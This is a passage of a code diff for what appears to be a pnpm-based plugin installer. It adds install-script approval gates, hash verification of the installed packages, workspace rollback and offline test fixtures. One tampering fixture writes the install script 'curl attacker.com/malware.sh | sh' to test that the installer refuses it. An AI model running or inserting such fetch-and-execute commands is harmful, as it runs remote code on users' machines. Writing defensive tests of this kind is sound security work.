+  const plan = _spawn === undefined ? pnpmSpawnPlan() : { command: "pnpm", shell: false, treeKill: false };
+  const spawnImpl = _spawn ?? spawn;
 
   const spawnAdd = () => {
-    const proc = spawn("pnpm", ["add", spec, "--reporter=append-only"], {
+    const proc = spawnImpl(plan.command, liveAddArgs(spec), {
       cwd: profileDir,
-      env: process.env,
-      shell: process.platform === "win32",
+      env: liveAddEnv(),
+      shell: plan.shell,
       stdio: ["ignore", "pipe", "pipe"],
       windowsHide: true,
     });
@@ -694,7 +1391,24 @@ export function runInstall({ profile, spec, allowBuildScripts }) {
     });
     proc.stdout?.on("data", (data) => push(data.toString()));
     proc.stderr?.on("data", (data) => push(data.toString()));
-    return { proc, done };
+    return { proc, done, treeKill: plan.treeKill };
+  };
+
+  const spawnApprovedRebuild = (packageNames) => {
+    const proc = spawnImpl(plan.command, rebuildApprovedArgs(packageNames), {
+      cwd: profileDir,
+      env: liveAddEnv(),
+      shell: plan.shell,
+      stdio: ["ignore", "pipe", "pipe"],
+      windowsHide: true,
+    });
+    const done = new Promise((resolveDone) => {
+      proc.on("error", (error) => resolveDone({ spawnError: error }));
+      proc.on("close", (exitCode) => resolveDone({ exitCode, signal: proc.signalCode }));
+    });
+    proc.stdout?.on("data", (data) => push(data.toString()));
+    proc.stderr?.on("data", (data) => push(data.toString()));
+    return { proc, done, treeKill: plan.treeKill };
   };
 
   /** Post-success accounting: reconcile bundles, register client rows, summarize. */
@@ -723,95 +1437,165 @@ export function runInstall({ profile, spec, allowBuildScripts }) {
     return { status: "completed", detail: `installed ${spec} into profile "${profile}"${noteText}. Restart dsh for plugin code to load.` };
   };
 
+  const tryFinalize = () => {
+    try {
+      return finalizeSuccess();
+    } catch (error) {
+      return { status: "failed", detail: `pnpm installed ${spec} but post-install reconciliation failed: ${error?.message ?? String(error)}` };
+    }
+  };
+
   const settle = async (outcome) => {
     if (outcome.spawnError !== undefined) {
-      // pnpm 缺失时先尝试 corepack 自愈一次，成功则重跑安装。
       if (outcome.spawnError.code === "ENOENT" && !pnpmSelfHealed) {
         pnpmSelfHealed = true;
         const healed = await enablePnpmViaCorepack(push);
         if (healed) {
           const retry = spawnAdd();
-          current = retry.proc;
+          current = retry;
           return settle(await retry.done);
         }
+        restoreOriginalWorkspace();
         return { status: "failed", detail: "pnpm not found on PATH and `corepack enable pnpm` could not provision it — install pnpm (e.g. `npm i -g pnpm`) to manage profile plugins" };
       }
+      restoreOriginalWorkspace();
       const hint = outcome.spawnError.code === "ENOENT"
         ? "pnpm not found on PATH — install pnpm (e.g. `corepack enable pnpm`) to manage profile plugins"
         : `could not start pnpm: ${outcome.spawnError.message}`;
       return { status: "failed", detail: hint };
     }
     if (outcome.exitCode === null) {
+      restoreOriginalWorkspace();
       return { status: "killed", detail: outcome.signal ? `signal: ${outcome.signal}` : "killed before exit" };
-    }
-    if (outcome.exitCode === 0) {
-      return finalizeSuccess();
     }
     const log = collected.join("");
     const ignored = parseIgnoredBuilds(log);
+
     if (ignored.length === 0) {
-      return { status: "failed", detail: `pnpm add ${spec} failed (exit code ${outcome.exitCode}). See job output.` };
+      if (!restoreOriginalWorkspace()) {
+        return { status: "failed", detail: `could not restore pnpm-workspace.yaml after the script-blocking probe: ${workspaceRestoreError?.message ?? "unknown error"}` };
+      }
+      if (outcome.exitCode !== 0) {
+        return { status: "failed", detail: `pnpm add ${spec} failed (exit code ${outcome.exitCode}). See job output.` };
+      }
+      return tryFinalize();
     }
-    // 放行构建脚本 = 让这些包在用户机器上、以用户的权限、在任何插件代码加载
-    // 之前执行任意命令。这个决定属于用户，不属于我们。所以没有点名同意时就停
-    // 在这里——pnpm 拦截的位置恰好在「已下载」与「已执行」之间，此刻什么都还
-    // 没跑，profile 也一个字节没动。
+
+    // Materialized proof calculation:
+    // Determine candidate name and compute canonical proof from the materialized tree
+    const candidateName = resolveCandidateName(profileDir, spec, beforeDeps, preflight);
+    let currentProof;
+    try {
+      currentProof = computeMaterializedProof(profileDir, candidateName, ignored);
+    } catch (proofErr) {
+      restoreOriginalWorkspace();
+      return { status: "failed", detail: `failed to compute materialized package proof for ${spec}: ${proofErr.message}` };
+    }
+
     const consented = new Set((Array.isArray(allowBuildScripts) ? allowBuildScripts : []).map((name) => String(name)));
     const missing = ignored.filter((entry) => !consented.has(entry.name));
-    if (missing.length > 0) {
+    if (missing.length > 0 || approvedProof === undefined) {
       push(`\n[dsh-plugin-mall] pnpm blocked install scripts for: ${ignored.map((entry) => entry.name).join(", ")}\n`);
       push("[dsh-plugin-mall] stopping for approval — no install script ran, nothing is loadable yet.\n");
       let disclosure;
       try {
-        disclosure = await describeBuildScripts(missing, {
-          registry: await resolveRegistry(profile),
-          installedName: npmNameOf(spec) ?? undefined,
-        });
+        const hints = _describe !== undefined
+          ? await _describe(missing.length > 0 ? missing : ignored)
+          : await describeBuildScripts(missing.length > 0 ? missing : ignored, {
+            registry: await resolveRegistry(profile),
+            installedName: npmNameOf(spec) ?? undefined,
+          });
+        disclosure = disclosureFromMaterializedProof(currentProof, hints);
       } catch {
-        disclosure = missing.map((entry) => ({ ...entry, direct: false }));
+        disclosure = disclosureFromMaterializedProof(currentProof);
       }
-      return { status: "failed", detail: renderApprovalNeeded(spec, disclosure), needsApproval: disclosure };
+      if (!restoreOriginalWorkspace()) {
+        return { status: "failed", detail: `could not restore pnpm-workspace.yaml after preparing install-script disclosure: ${workspaceRestoreError?.message ?? "unknown error"}` };
+      }
+      return { status: "failed", detail: renderApprovalNeeded(spec, disclosure), needsApproval: disclosure, proof: currentProof };
     }
+
+    // Canonical proof verification on retry:
+    // Require exact byte-for-byte canonical proof equality
+    const currentProofStr = serializeCanonicalProof(currentProof);
+    const approvedProofStr = serializeCanonicalProof(approvedProof);
+    if (currentProofStr !== approvedProofStr) {
+      push("\n[dsh-plugin-mall] security error: materialized package proof does not match approved token proof (content, scripts, or package identity changed) — refusing to run scripts and rolling back\n");
+      restoreOriginalWorkspace();
+      return {
+        status: "failed",
+        detail: "security verification failed: package content, scripts, or resolved identity changed after approval was granted — install aborted to protect the profile.",
+      };
+    }
+
     push(`\n[dsh-plugin-mall] approved install scripts: ${ignored.map((entry) => entry.name).join(", ")}\n`);
-    push("[dsh-plugin-mall] allowing them in the profile's pnpm-workspace.yaml and retrying once.\n");
-    let rollbackAllowBuilds;
+    push("[dsh-plugin-mall] temporarily allowing them in the profile's pnpm-workspace.yaml and retrying once.\n");
+
+    workspaceRestored = false; // allow writing temporary approved builds
     try {
-      rollbackAllowBuilds = ensureAllowBuilds(profileDir, ignored.map((entry) => entry.name));
+      const currentWs = existsSync(workspacePath) ? readFileSync(workspacePath, "utf8") : DEFAULT_WORKSPACE_YAML;
+      const nextWs = enableApprovedBuildSelectors(currentWs, ignored.map((entry) => entry.selector));
+      writeYamlChecked(workspacePath, nextWs, "pnpm-workspace.yaml");
     } catch (error) {
-      return { status: "failed", detail: `could not allow the blocked build scripts: ${error.message}. The profile was left untouched — approve them yourself with \`pnpm approve-builds\` in ${profileDir}, then retry.` };
+      restoreOriginalWorkspace();
+      return { status: "failed", detail: `could not allow the blocked build scripts: ${error.message}. The profile was left untouched.` };
     }
-    // allowBuilds 是持久化的安全配置。为一次没装成的插件单向放宽它，等于以后
-    // 这个包名再出现（哪怕是别人的传递依赖）就静默放行——失败必须收回。
-    const revert = () => {
-      if (rollbackAllowBuilds === undefined) return;
-      try {
-        rollbackAllowBuilds();
-        push("[dsh-plugin-mall] install failed — reverted the allowBuilds change, the profile is as it was\n");
-      } catch {
-        /* 还原失败不该盖掉真正的失败原因 */
-      }
-    };
-    const retry = spawnAdd();
-    current = retry.proc;
+
+    const retry = spawnApprovedRebuild(ignored.map((entry) => entry.name));
+    current = retry;
     const retryOutcome = await retry.done;
+
+    // Restore workspace bytes on EVERY branch (including success) before finalize
+    if (!restoreOriginalWorkspace()) {
+      return { status: "failed", detail: `approved scripts finished but pnpm-workspace.yaml could not be restored: ${workspaceRestoreError?.message ?? "unknown error"}` };
+    }
+
     if (retryOutcome.spawnError !== undefined) {
-      revert();
       return { status: "failed", detail: `retry could not start pnpm: ${retryOutcome.spawnError.message}` };
     }
-    if (retryOutcome.exitCode === 0) {
-      return finalizeSuccess();
+    if (retryOutcome.exitCode === null) {
+      return { status: "killed", detail: retryOutcome.signal ? `signal: ${retryOutcome.signal}` : "killed before exit" };
     }
-    revert();
-    return { status: "failed", detail: `pnpm add ${spec} still failed after allowing build scripts (exit code ${retryOutcome.exitCode}). See job output. The allowBuilds change was reverted; pnpm may still have left the dependency in the profile's package.json — market_uninstall removes it.` };
+    if (retryOutcome.exitCode === 0) {
+      return tryFinalize();
+    }
+    return { status: "failed", detail: `pnpm add ${spec} still failed after allowing build scripts (exit code ${retryOutcome.exitCode}). See job output.` };
   };
 
   const first = spawnAdd();
-  current = first.proc;
-  const done = first.done.then((outcome) => settle(outcome));
+  current = first;
+  const done = first.done
+    .then((outcome) => settle(outcome))
+    .catch((error) => {
+      restoreOriginalWorkspace();
+      return {
+        status: "failed",
+        detail: `install of ${spec} hit an internal error: ${error?.message ?? String(error)}`,
+      };
+    })
+    .then((result) => {
+      if (!restoreOriginalWorkspace()) {
+        result = {
+          status: "failed",
+          detail: `pnpm-workspace.yaml restoration failed (${workspaceRestoreError?.message ?? "unknown error"}); refusing to finalize and rolling the profile back`,
+        };
+      }
+      if (result.status === "completed") {
+        // Keep the marker as-is
+      } else {
+        try {
+          rollbackPendingSnapshot(profileDir);
+          push("\n[dsh-plugin-mall] install did not complete — restored profile files to their pre-install state and cleared the pending marker\n");
+        } catch (error) {
+          push(`\n[dsh-plugin-mall] WARNING: could not roll back the pending snapshot: ${error.message}\n`);
+        }
+      }
+      return result;
+    });
 
   return {
     cancel: () => {
-      current?.kill();
+      cancelSpawned(current);
     },
     done,
     readOutput: () => {
@@ -838,12 +1622,32 @@ function failedNow(detail) {
  * `dsh.profile.bundles` (the removed dependency's bundle entry drops out) and
  * deletes the client loader row `ensureClientRow` had registered for it.
  */
-export function runRemove({ profile, packageName }, selfHealed = false) {
+export function runRemove({ profile, packageName, _profileDir, _spawn }) {
+  // Same per-profile queue as runInstall — a remove must never run
+  // concurrently with an install (or another remove) in the same profile.
+  return serializedProducer(_profileDir ?? profileLockKey(profile), () =>
+    runRemoveInner({ profile, packageName, _profileDir, _spawn }, false));
+}
+
+function runRemoveInner({ profile, packageName, _profileDir, _spawn }, selfHealed) {
   let profileDir;
-  try {
-    profileDir = resolveProfileDir(profile);
-  } catch (error) {
-    return failedNow(`invalid profile: ${error.message}`);
+  if (_profileDir !== undefined) {
+    profileDir = _profileDir;
+  } else {
+    try {
+      profileDir = resolveProfileDir(profile);
+    } catch (error) {
+      return failedNow(`invalid profile: ${error.message}`);
+    }
+  }
+  // Fail closed: an unresolved install transaction (pending marker) owns this
+  // profile until startup/CLI recovery commits or rolls it back. Removing
+  // packages underneath it would corrupt the state the marker protects.
+  // Existence-only, like markPendingSnapshot: a corrupt marker blocks just as
+  // hard as a valid one, and is left untouched for the recovery path.
+  const markerPath = pendingMarkerPath(profileDir);
+  if (existsSync(markerPath)) {
+    return failedNow(`profile "${profile}" has a pending install transaction (${markerPath}) — refusing to remove ${packageName} until it is resolved; restart dsh (startup recovery) or run \`dsh-plugin-guard guard recover\` first`);
   }
   const manifestPath = join(profileDir, "package.json");
   if (!existsSync(manifestPath)) {
@@ -859,25 +1663,26 @@ export function runRemove({ profile, packageName }, selfHealed = false) {
   };
   let current = undefined;
 
-  const proc = spawn("pnpm", ["remove", packageName, "--reporter=append-only"], {
+  const plan = _spawn === undefined ? pnpmSpawnPlan() : { command: "pnpm", shell: false, treeKill: false };
+  const proc = (_spawn ?? spawn)(plan.command, ["remove", packageName, "--reporter=append-only"], {
     cwd: profileDir,
     env: process.env,
-    shell: process.platform === "win32",
+    shell: plan.shell,
     stdio: ["ignore", "pipe", "pipe"],
     windowsHide: true,
   });
-  current = proc;
+  current = { proc, treeKill: plan.treeKill };
   const done = new Promise((resolve) => {
     proc.on("error", (error) => resolve({ spawnError: error }));
     proc.on("close", (exitCode) => resolve({ exitCode, signal: proc.signalCode }));
   }).then(async (outcome) => {
     if (outcome.spawnError !== undefined) {
-      // pnpm 缺失时先 corepack 自愈一次再重试（重试在新 producer 里跑，
-      // 这里必须返回它的 done outcome——返回 producer 本体会让 tracker
-      // 把成功任务记成 failed）。
+      // pnpm 缺失时先 corepack 自愈一次再重试（重试复用同一个队列内的
+      // producer——若走 runRemove 重新排队会死锁——且必须返回它的 done
+      // outcome，返回 producer 本体会让 tracker 把成功任务记成 failed）。
       if (outcome.spawnError.code === "ENOENT" && selfHealed !== true) {
         const healed = await enablePnpmViaCorepack(push);
-        if (healed) return await runRemove({ profile, packageName }, true).done;
+        if (healed) return await runRemoveInner({ profile, packageName, _profileDir, _spawn }, true).done;
       }
       const hint = outcome.spawnError.code === "ENOENT"
         ? "pnpm not found on PATH — install pnpm (e.g. `corepack enable pnpm`) to manage profile plugins"
@@ -890,18 +1695,24 @@ export function runRemove({ profile, packageName }, selfHealed = false) {
     if (outcome.exitCode !== 0) {
       return { status: "failed", detail: `pnpm remove ${packageName} failed (exit code ${outcome.exitCode}). See job output.` };
     }
-    const bundles = reconcileBundles(profileDir, beforeDeps);
-    const clientRow = removeClientRow(profileDir, packageName);
-    const notes = [`bundle layer(s) now: ${bundles.join(", ") || "none (template only)"}`];
-    if (clientRow.removed) notes.push(`removed client loader row "${clientRow.rowId}" from cordis.patch.yml`);
-    return { status: "completed", detail: `removed ${packageName} from profile "${profile}" — ${notes.join("; ")}. Restart dsh for the change to take effect.` };
-  });
+    // 卸完后的对账（bundle 列表、client 行）抛错也必须落成 terminal failed，
+    // 不能让 done 拒绝。
+    try {
+      const bundles = reconcileBundles(profileDir, beforeDeps);
+      const clientRow = removeClientRow(profileDir, packageName);
+      const notes = [`bundle layer(s) now: ${bundles.join(", ") || "none (template only)"}`];
+      if (clientRow.removed) notes.push(`removed client loader row "${clientRow.rowId}" from cordis.patch.yml`);
+      return { status: "completed", detail: `removed ${packageName} from profile "${profile}" — ${notes.join("; ")}. Restart dsh for the change to take effect.` };
+    } catch (error) {
+      return { status: "failed", detail: `pnpm removed ${packageName} but post-remove reconciliation failed: ${error?.message ?? String(error)}` };
+    }
+  }).catch((error) => ({ status: "failed", detail: `remove of ${packageName} hit an internal error: ${error?.message ?? String(error)}` }));
   proc.stdout?.on("data", (data) => push(data.toString()));
   proc.stderr?.on("data", (data) => push(data.toString()));
 
   return {
     cancel: () => {
-      current?.kill();
+      cancelSpawned(current);
     },
     done,
     readOutput: () => {
@@ -1007,9 +1818,706 @@ function runAllowBuildsFixtures() {
   return failed;
 }
 
+// ── transaction fixtures (deterministic, offline) ───────────────────────────
+//
+// The findings these pin:
+//   1. pnpm exiting 0 while printing "Ignored build scripts" must NOT
+//      finalize success — the approval gate applies to successful output too.
+//   2. An exception in finalizeSuccess must become a terminal failed outcome
+//      WITH rollback — done resolves exactly once, never rejects.
+//   3. add/remove are serialized per profile; remove fails closed while a
+//      pending marker exists; cancel while queued never spawns pnpm.
+//   4. The spawn plan resolves pnpm without a shell where possible, and a
+//      cancelled install rolls back only after the process exited.
+// They drive runInstall/runRemove through the `_profileDir`/`_spawn`/
+// `_describe` seams against temp profiles (<tmp>/home/profiles/p), so no real
+// profile, pnpm, or network is involved.
+
+/** Minimal fake ChildProcess: stdout/stderr emitters, kill(), manual finish. */
+class FakeProc extends EventEmitter {
+  constructor() {
+    super();
+    this.stdout = new EventEmitter();
+    this.stderr = new EventEmitter();
+    this.pid = 424242;
+    this.signalCode = null;
+  }
+  kill() {
+    queueMicrotask(() => {
+      this.signalCode = "SIGTERM";
+      this.emit("close", null, "SIGTERM");
+    });
+  }
+  finish(code, out = "") {
+    queueMicrotask(() => {
+      if (out.length > 0) this.stdout.emit("data", Buffer.from(out));
+      this.emit("close", code);
+    });
+  }
+}
+
+/** Spawn fake consuming scripted {code, out, beforeExit} steps; records calls. */
+function scriptedSpawn(steps) {
+  const calls = [];
+  const spawnFn = (command, args, options) => {
+    calls.push({ command, args, options });
+    const proc = new FakeProc();
+    const step = steps[calls.length - 1];
+    if (step === undefined) proc.finish(1, "unexpected extra spawn");
+    else {
+      step.beforeExit?.();
+      proc.finish(step.code, step.out ?? "");
+    }
+    return proc;
+  };
+  return { spawnFn, calls };
+}
+
+/** Spawn fake whose procs stay alive until the test finishes them. */
+function blockingSpawn() {
+  const procs = [];
+  const spawnFn = () => {
+    const proc = new FakeProc();
+    procs.push(proc);
+    return proc;
+  };
+  return { spawnFn, procs };
+}
+
+/** Temp profile at <tmp>/home/profiles/p — guard home resolves to <tmp>/home/guard. */
+function makeTempProfile(label, dependencies = {}) {
+  const home = mkdtempSync(join(tmpdir(), `dsh-mall-selftest-${label}-`));
+  const profileDir = join(home, "profiles", "p");
+  mkdirSync(profileDir, { recursive: true });
+  const manifest = JSON.stringify({ name: "p", dependencies }, undefined, 2) + "\n";
+  writeFileSync(join(profileDir, "package.json"), manifest);
+  return { home, profileDir, manifest, cleanup: () => rmSync(home, { recursive: true, force: true }) };
+}
+
+function materializeFakePackage(profileDir, name, version = "1.0.0", scripts = {}, files = { "index.js": "module.exports = {};\n" }) {
+  const pkgDir = join(profileDir, "node_modules", ...name.split("/"));
+  mkdirSync(pkgDir, { recursive: true });
+  const manifest = { name, version, scripts };
+  writeFileSync(join(pkgDir, "package.json"), JSON.stringify(manifest, undefined, 2) + "\n");
+  for (const [relPath, content] of Object.entries(files)) {
+    const full = join(pkgDir, relPath);
+    mkdirSync(dirname(full), { recursive: true });
+    writeFileSync(full, content);
+  }
+  return pkgDir;
+}
+
+const describeStub = async (missing) => missing.map((entry) => ({ ...entry, direct: true, scripts: {} }));
+
+// 回滚校验要求 marker 能指认候选包（guard.js sanitizeSnapshot），生产环境由
+// preflight 报告带来；fixtures 给同名存根。
+const preflightStub = (name) => ({ candidate: { name } });
+
+async function runTransactionFixtures() {
+  let failed = 0;
+  const check = (label, ok, extra) => {
+    if (!ok) failed++;
+    console.log(`  ${ok ? "PASS" : "FAIL"} ${label}`);
+    if (!ok && extra !== undefined) console.log(`       ${extra}`);
+  };
+  const tick = () => new Promise((resolve) => setTimeout(resolve, 1));
+  const flush = async (rounds = 5) => { for (let index = 0; index < rounds; index++) await tick(); };
+
+  // 0. hashPackageTree 确定性与符号链接越界防御
+  {
+    const tempDir = mkdtempSync(join(tmpdir(), "dsh-mall-selftest-hash-"));
+    try {
+      materializeFakePackage(tempDir, "test-pkg", "1.0.0", { postinstall: "node test.js" }, { "a.js": "const a = 1;\n", "b.js": "const b = 2;\n" });
+      const pkgPath = join(tempDir, "node_modules", "test-pkg");
+      const hash1 = hashPackageTree(pkgPath);
+      const hash2 = hashPackageTree(pkgPath);
+      check("hashPackageTree 确定性（内容不变哈希相同）", typeof hash1 === "string" && hash1.length === 64 && hash1 === hash2);
+
+      // 修改文件内容哈希改变
+      writeFileSync(join(pkgPath, "a.js"), "const a = 999;\n");
+      const hash3 = hashPackageTree(pkgPath);
+      check("包内文件修改 → hashPackageTree 哈希变化", hash1 !== hash3);
+
+      // Bundled dependencies live below the package's own node_modules and
+      // may contain lifecycle helpers/native loaders. They are artifact bytes,
+      // not the profile's dependency tree, so changing them must invalidate
+      // the approval proof as well.
+      const bundledDir = join(pkgPath, "node_modules", "bundled-helper");
+      mkdirSync(bundledDir, { recursive: true });
+      writeFileSync(join(bundledDir, "package.json"), '{"name":"bundled-helper","version":"1.0.0"}\n');
+      writeFileSync(join(bundledDir, "loader.js"), "safe();\n");
+      const bundledHash1 = hashPackageTree(pkgPath);
+      writeFileSync(join(bundledDir, "loader.js"), "malicious();\n");
+      const bundledHash2 = hashPackageTree(pkgPath);
+      check("包内 bundled node_modules 字节变化 → artifact hash 变化", bundledHash1 !== bundledHash2);
+
+      // 符号链接/Junction 越界防御
+      const outsideDir = mkdtempSync(join(tmpdir(), "dsh-mall-outside-"));
+      try {
+        writeFileSync(join(outsideDir, "secret.txt"), "secret");
+        let escapeDetected = false;
+        try {
+          const { symlinkSync } = await import("node:fs");
+          try {
+            symlinkSync(outsideDir, join(pkgPath, "link-outside-dir"), "junction");
+          } catch {
+            symlinkSync(join(outsideDir, "secret.txt"), join(pkgPath, "link-outside.txt"));
+          }
+          hashPackageTree(pkgPath);
+        } catch (err) {
+          escapeDetected = /symlink escape/.test(err.message);
+        }
+        check("hashPackageTree 符号链接越界防御（拒绝越界 symlink）", escapeDetected);
+      } finally {
+        rmSync(outsideDir, { recursive: true, force: true });
+      }
+    } finally {
+      rmSync(tempDir, { recursive: true, force: true });
+    }
+  }
+
+  // 1a. exit 0 + "Ignored build scripts" 且未批准：必须停在批准闸（failed +
+  // needsApproval），携带 proof，绝不 finalize，回滚收掉 marker，且只 spawn 一次。
+  {
+    const { profileDir, cleanup } = makeTempProfile("ignored-gate");
+    try {
+      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
+      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "node install.js" });
+      const { spawnFn, calls } = scriptedSpawn([{ code: 0, out: "Packages are cloned\nIgnored build scripts: node-pty@1.0.0\nDone\n" }]);
+      const producer = runInstall({
+        profile: "p",
+        spec: "some-plugin",
+        preflight: preflightStub("some-plugin"),
+        _profileDir: profileDir,
+        _spawn: spawnFn,
+        // Deliberately stale/malicious registry data. The approval disclosure
+        // must still use the manifest and bytes from the materialized tree.
+        _describe: async () => [{
+          name: "node-pty",
+          version: "1.0.0",
+          direct: true,
+          scripts: { install: "registry lied" },
+          contentHash: "0".repeat(64),
+          weeklyDownloads: 123,
+        }],
+      });
+      const outcome = await producer.done;
+      check(
+        "退出码 0 + Ignored build scripts（未批准）→ 停在批准闸，返回 proof，不 finalize",
+        outcome.status === "failed"
+          && Array.isArray(outcome.needsApproval)
+          && outcome.needsApproval.some((entry) => entry.name === "node-pty")
+          && outcome.proof !== undefined
+          && outcome.proof.candidate.name === "some-plugin"
+          && outcome.proof.blockedPackages.some((e) => e.name === "node-pty")
+          && outcome.needsApproval.some((entry) => entry.name === "node-pty"
+            && entry.version === "1.0.0"
+            && entry.scripts?.install === "node install.js"
+            && entry.contentHash === outcome.proof.blockedPackages.find((proofEntry) => proofEntry.name === "node-pty")?.contentHash
+            && entry.contentHash !== "0".repeat(64)
+            && entry.weeklyDownloads === 123)
+          && calls.length === 1
+          && !existsSync(pendingMarkerPath(profileDir)),
+        `status=${outcome.status} calls=${calls.length} marker=${existsSync(pendingMarkerPath(profileDir))}`,
+      );
+      const call = calls[0] ?? { args: [], options: {} };
+      check(
+        "实装 argv/env：strict-dep-builds + peer 关闭 + cwd/shell 正确",
+        JSON.stringify(call.args) === JSON.stringify(liveAddArgs("some-plugin"))
+          && call.args.includes("--config.strict-dep-builds=true")
+          && call.args.includes("--config.auto-install-peers=false")
+          && call.options.env?.npm_config_strict_dep_builds === "true"
+          && call.options.env?.NPM_CONFIG_STRICT_DEP_BUILDS === "true"
+          && call.options.env?.npm_config_auto_install_peers === "false"
+          && call.options.cwd === profileDir
+          && call.options.shell === false,
+        JSON.stringify({ args: call.args, shell: call.options?.shell, cwd: call.options?.cwd }),
+      );
+    } finally {
+      cleanup();
+    }
+  }
+
+  // 1b. exit 0 + Ignored build scripts 且已点名批准 + approvedProof 匹配：
+  // 写 allowBuilds 重试一次，重试输出干净才 finalize；成功后 workspace 原样还原，保留 pending marker。
+  {
+    const { profileDir, cleanup } = makeTempProfile("ignored-approved");
+    try {
+      const initialWs = "packages:\n  - .\n\nnodeLinker: hoisted\n";
+      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), initialWs);
+      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
+      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "node install.js" });
+      const approvedProof = computeMaterializedProof(profileDir, "some-plugin", [{ name: "node-pty", version: "1.0.0", selector: "node-pty@1.0.0" }]);
+
+      let temporaryApprovedWorkspace;
+      const { spawnFn, calls } = scriptedSpawn([
+        { code: 0, out: "Ignored build scripts: node-pty@1.0.0\n" },
+        {
+          code: 0,
+          out: "Done\n",
+          beforeExit: () => {
+            temporaryApprovedWorkspace = load(readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8"));
+          },
+        },
+      ]);
+      const producer = runInstall({
+        profile: "p",
+        spec: "some-plugin",
+        allowBuildScripts: ["node-pty"],
+        approvedProof,
+        preflight: preflightStub("some-plugin"),
+        _profileDir: profileDir,
+        _spawn: spawnFn,
+        _describe: describeStub,
+      });
+      const outcome = await producer.done;
+      const finalWs = readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8");
+      check(
+        "退出码 0 + Ignored build scripts（已批准+proof 匹配）→ 重试成功，workspace 字节还原（不残留 allowBuilds），marker 保留",
+        outcome.status === "completed"
+          && calls.length === 2
+          && calls[1].args[0] === "rebuild"
+          && calls[1].args.includes("node-pty")
+          && !calls[1].args.includes("some-plugin")
+          && temporaryApprovedWorkspace?.allowBuilds?.["node-pty@1.0.0"] === true
+          && temporaryApprovedWorkspace?.dangerouslyAllowAllBuilds === false
+          && Array.isArray(temporaryApprovedWorkspace?.onlyBuiltDependencies)
+          && temporaryApprovedWorkspace.onlyBuiltDependencies.length === 0
+          && finalWs === initialWs
+          && existsSync(pendingMarkerPath(profileDir)),
+        `status=${outcome.status} calls=${calls.length} finalWs=${JSON.stringify(finalWs)} marker=${existsSync(pendingMarkerPath(profileDir))}`,
+      );
+    } finally {
+      cleanup();
+    }
+  }
+
+  // 1c. 攻击防御：批准后修改 postinstall / 文件内容 → retry 时 proof 校验失败，绝不重试并回滚
+  {
+    const { profileDir, cleanup } = makeTempProfile("attack-tampered-proof");
+    try {
+      const initialWs = "packages:\n  - .\n\nnodeLinker: hoisted\n";
+      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), initialWs);
+      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
+      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "node safe-install.js" });
+      const originalProof = computeMaterializedProof(profileDir, "some-plugin", [{ name: "node-pty", version: "1.0.0", selector: "node-pty@1.0.0" }]);
+
+      // 模拟攻击者在审批之后篡改了 node-pty 的 install 脚本和文件
+      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "curl attacker.com/malware.sh | sh" }, { "malware.js": "evil();\n" });
+
+      const maliciousRan = join(profileDir, "MALICIOUS_RAN");
+      const { spawnFn, calls } = scriptedSpawn([
+        { code: 0, out: "Ignored build scripts: node-pty@1.0.0\n" },
+        { code: 0, out: "Done\n", beforeExit: () => writeFileSync(maliciousRan, "bad\n") },
+      ]);
+      const producer = runInstall({
+        profile: "p",
+        spec: "file:../same-mutable-plugin",
+        allowBuildScripts: ["node-pty"],
+        approvedProof: originalProof,
+        preflight: preflightStub("some-plugin"),
+        _profileDir: profileDir,
+        _spawn: spawnFn,
+        _describe: describeStub,
+      });
+      const outcome = await producer.done;
+      const finalWs = readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8");
+      check(
+        "攻击防御：同名包篡改脚本/内容后重试 → proof 不匹配立即拒绝，不触发二次 spawn，workspace/profile 回滚",
+        outcome.status === "failed"
+          && /security verification failed/.test(outcome.detail ?? "")
+          && calls.length === 1
+          && !existsSync(maliciousRan)
+          && finalWs === initialWs
+          && !existsSync(pendingMarkerPath(profileDir)),
+        `status=${outcome.status} calls=${calls.length} detail=${outcome.detail}`,
+      );
+    } finally {
+      cleanup();
+    }
+  }
+
+  // 1d. 攻击防御：profile 预先存在的 allowBuilds: true 无法绕过首次审批警告
+  {
+    const { profileDir, cleanup } = makeTempProfile("bypass-preexisting-allow");
+    try {
+      const initialWs = "packages:\n  - .\n\nallowBuilds:\n  evil-script-pkg: true\nonlyBuiltDependencies:\n  - evil-script-pkg\ndangerouslyAllowAllBuilds: true\n\nnodeLinker: hoisted\n";
+      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), initialWs);
+      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
+      materializeFakePackage(profileDir, "evil-script-pkg", "1.0.0", { postinstall: "node evil.js" });
+
+      let firstProbeWorkspace;
+      const { spawnFn, calls } = scriptedSpawn([
+        {
+          code: 0,
+          out: "Ignored build scripts: evil-script-pkg@1.0.0\n",
+          beforeExit: () => {
+            firstProbeWorkspace = load(readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8"));
+          },
+        },
+      ]);
+      const producer = runInstall({
+        profile: "p",
+        spec: "some-plugin",
+        preflight: preflightStub("some-plugin"),
+        _profileDir: profileDir,
+        _spawn: spawnFn,
+        _describe: describeStub,
+      });
+      const outcome = await producer.done;
+      const finalWs = readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8");
+      check(
+        "攻击防御：预先存在的 allowBuilds 在首轮被中和 → 依然触发审批闸，且事后恢复用户原本的 workspace 字节",
+        outcome.status === "failed"
+          && Array.isArray(outcome.needsApproval)
+          && outcome.needsApproval.some((e) => e.name === "evil-script-pkg")
+          && calls.length === 1
+          && Object.keys(firstProbeWorkspace?.allowBuilds ?? {}).length === 0
+          && Array.isArray(firstProbeWorkspace?.onlyBuiltDependencies)
+          && firstProbeWorkspace.onlyBuiltDependencies.length === 0
+          && firstProbeWorkspace?.dangerouslyAllowAllBuilds === false
+          && finalWs === initialWs,
+        `status=${outcome.status} calls=${calls.length} finalWs=${JSON.stringify(finalWs)}`,
+      );
+    } finally {
+      cleanup();
+    }
+  }
+
+  // 1d-2. package.json can carry the same build authorization independently
+  // of pnpm-workspace.yaml. Refuse every known positive form before spawning.
+  {
+    const policies = [
+      { pnpm: { allowBuilds: { "evil-script-pkg": true } } },
